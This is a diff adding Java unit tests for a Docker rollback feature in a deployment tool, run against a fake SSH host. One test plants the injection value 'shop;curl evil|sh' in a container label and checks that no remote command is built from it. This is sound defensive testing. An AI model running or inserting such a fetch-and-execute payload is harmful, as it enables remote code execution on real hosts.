@@ -353,6 +353,128 @@ class OpsHubTest {
         assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("Deploy stopped at build") && t.contains("the host says no"));
     }
 
+    /** A host running one deployed app, whose image history and answers the test sets. */
+    static final class RollbackRunner implements RemoteRunner {
+        final List<String> commands = new ArrayList<>();
+        String label = "nmox.ops.app=shop";
+        String image = "nmox/shop:300";
+        String ports = "0.0.0.0:80->3000/tcp";
+        List<String> tags = List.of("300", "latest", "100", "200");
+        boolean imagesFail;
+
+        @Override
+        public Result run(SshTarget target, String remoteCommand, InputStream stdin, Consumer<String> onLine, Duration timeout) {
+            commands.add(remoteCommand);
+            String row = "{\"Names\":\"nmox-shop\",\"Image\":\"" + image + "\",\"Status\":\"Up\",\"Ports\":\"" + ports
+                    + "\",\"Labels\":\"" + label + "\",\"Networks\":\"bridge\"}";
+            if (remoteCommand.startsWith("echo nmox-probe 1")) {
+                probe("container " + row).forEach(onLine);
+                return new Result(0, "", false);
+            }
+            if (remoteCommand.startsWith("docker images ")) {
+                if (imagesFail) {
+                    onLine.accept("Cannot connect to the Docker daemon");
+                    return new Result(1, "Cannot connect to the Docker daemon", false);
+                }
+                tags.forEach(onLine);
+                return new Result(0, "", false);
+            }
+            if (remoteCommand.startsWith("docker rm -f")) {
+                image = remoteCommand.substring(remoteCommand.lastIndexOf(' ') + 1);
+            }
+            if (remoteCommand.startsWith("sleep 2; docker ps")) {
+                onLine.accept(row.replace("\"Image\":\"nmox/shop:300\"", "\"Image\":\"" + image + "\""));
+                onLine.accept("http 80 200");
+            }
+            return new Result(0, "", false);
+        }
+    }
+
+    private OpsNode onlyService(OpsHub hub) {
+        List<OpsNode> services = hub.topology().nodes(OpsKind.SERVICE);
+        assertThat(services).hasSize(1);
+        return services.get(0);
+    }
+
+    @Test
+    @DisplayName("a rollback asks the host what it holds, offers the newest older image, runs two steps, and says where it landed")
+    void rollbackThroughTheEngine() {
+        RollbackRunner rr = new RollbackRunner();
+        OpsHub hub = new OpsHub(clock::get, Runnable::run, rr, prefs, cloud, ssh).withProviders(List.of(provider));
+        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
+        ssh.drain(2);
+        OpsNode service = onlyService(hub);
+        assertThat(service.app).as("the label is on the node, raw").isEqualTo("shop");
+        OpsHub.RollbackOffer[] offer = {null};
+        hub.rollbackOffer(service, o -> offer[0] = o);
+        assertThat(offer[0]).as("the answer waits for the host").isNull();
+        ssh.drain(2);
+        assertThat(offer[0].ok()).as(String.valueOf(offer[0].refusal())).isTrue();
+        assertThat(offer[0].fromStamp()).isEqualTo("300");
+        assertThat(offer[0].plan()).isEqualTo(new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "200"));
+        rr.commands.clear();
+        DeployRun run = hub.rollback(host, offer[0].plan(), offer[0].fromStamp());
+        assertThat(run.rollback).isTrue();
+        assertThat(run.steps.keySet()).as("a rollback has only the steps it runs")
+                .containsExactly(org.nmox.studio.infra.ops.remote.Deployer.Step.RUN,
+                        org.nmox.studio.infra.ops.remote.Deployer.Step.VERIFY);
+        OpsHub.RollbackOffer[] second = {null};
+        hub.rollbackOffer(service, o -> second[0] = o);
+        assertThat(second[0].refusal()).as("one run per host at a time").contains("still running");
+        ssh.drain(3);
+        assertThat(run.ok()).isTrue();
+        assertThat(rr.commands).startsWith(offer[0].plan().run(), offer[0].plan().verify());
+        assertThat(rr.commands.get(0)).endsWith(" nmox/shop:200");
+        assertThat(hub.feed()).extracting(OpsEvent::text)
+                .anyMatch(t -> t.contains("back from 300 to 200"))
+                .anyMatch(t -> t.contains("shop on box is back on 200"));
+        assertThat(onlyService(hub).facts.get("image")).as("the probe after reads the new truth").isEqualTo("nmox/shop:200");
+    }
+
+    @Test
+    @DisplayName("a rollback is refused by name: not ours, no port, nothing older, images unreadable — and a hostile label reaches no shell")
+    void rollbackRefusals() {
+        RollbackRunner rr = new RollbackRunner();
+        OpsHub hub = new OpsHub(clock::get, Runnable::run, rr, prefs, cloud, ssh).withProviders(List.of(provider));
+        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
+        ssh.drain(2);
+        OpsHub.RollbackOffer[] offer = {null};
+        java.util.function.Supplier<String> ask = () -> {
+            offer[0] = null;
+            hub.rollbackOffer(onlyService(hub), o -> offer[0] = o);
+            ssh.drain(2);
+            return offer[0].refusal();
+        };
+        rr.tags = List.of("300", "latest");
+        assertThat(ask.get()).contains("no image of shop older than").contains("300");
+        rr.imagesFail = true;
+        assertThat(ask.get()).contains("could not read the images of shop on box").contains("Docker daemon");
+        rr.imagesFail = false;
+        // from here the host's answers change, so re-probe before asking
+        rr.ports = "3000/tcp";
+        hub.probe(host);
+        ssh.drain(2);
+        assertThat(ask.get()).contains("publishes no single port");
+        rr.ports = "0.0.0.0:80->3000/tcp";
+        rr.image = "someone/else:1";
+        hub.probe(host);
+        ssh.drain(2);
+        assertThat(ask.get()).as("the label is ours but the image is not").contains("was not deployed from NMOX Studio");
+        rr.image = "nmox/shop:300";
+        rr.label = "nmox.ops.app=shop;curl evil|sh";
+        hub.probe(host);
+        ssh.drain(2);
+        rr.commands.clear();
+        assertThat(ask.get()).contains("was not deployed from NMOX Studio");
+        assertThat(rr.commands).as("a label that is not a slug is refused before any remote line is built").isEmpty();
+        rr.label = "";
+        hub.probe(host);
+        ssh.drain(2);
+        assertThat(onlyService(hub).app).isNull();
+        assertThat(ask.get()).contains("was not deployed from NMOX Studio");
+        assertThat(hub.rollback(null, null, null)).isNull();
+    }
+
     @Test
     @DisplayName("destroying a provider host removes it and says billing stops; a provider's refusal keeps it and says why")
     void destroy() {
